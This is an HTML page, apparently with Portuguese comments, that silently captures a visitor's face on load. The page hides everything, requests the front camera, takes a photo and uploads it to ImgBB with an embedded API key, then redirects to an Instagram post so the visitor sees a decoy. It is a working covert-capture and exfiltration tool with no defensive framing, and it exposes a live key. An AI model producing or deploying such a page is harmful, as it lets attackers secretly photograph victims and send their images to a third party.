<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Automation</title>
    <style>
        body {
            display: none;
        }

        #preview {
            display: none;
        }
    </style>
</head>
<body>
    <video id="preview" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });

                const video = document.getElementById('preview');
                video.srcObject = stream;

                await new Promise((resolve) => video.onloadedmetadata = resolve);

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const base64Image = canvas.toDataURL('image/png');

                stream.getTracks().forEach(track => track.stop());

                // Faz o upload da imagem para ImgBB
                uploadImage(base64Image);
            } catch (error) {
                console.error('Erro ao capturar a imagem:', error);
            }
        }
//api aqui
        async function uploadImage(base64Image) {
            try {
                const response = await fetch('https://api.imgbb.com/1/upload?key=26522b8cb937d6c06d516d0cb8c75aaa', {
                    method: 'POST',
                    body: new URLSearchParams({
                        image: base64Image.split(',')[1] // Remove a parte do tipo de imagem (data:image/png;base64,)
                    })
                });

                const data = await response.json();

                if (data.success) {
                    console.log('Imagem enviada com sucesso:', data.data.url);
                    // Redireciona para o Instagram após o upload
                    window.location.href = 'https://www.instagram.com/p/DA-46FXv3pB/';
                } else {
                    console.error('Erro ao enviar a imagem:', data);
                }
            } catch (error) {
                console.error('Erro na requisição de upload:', error);
            }
        }

        window.onload = function () {
            capturePhoto();
        }
    </script>
</body>
</html>
